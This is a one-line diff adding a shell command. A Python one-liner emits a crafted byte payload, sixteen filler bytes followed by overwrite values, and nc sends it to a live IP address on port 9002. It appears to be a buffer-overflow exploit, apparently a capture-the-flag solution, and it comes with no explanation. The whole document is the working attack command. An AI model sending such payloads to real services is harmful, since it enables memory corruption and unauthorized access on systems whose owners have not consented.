@@ -1,0 +1,1 @@
+python -c "import sys; sys.stdout.buffer.write(b'1234567812345678\x6e\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\n')" | nc 35.200.120.35 9002
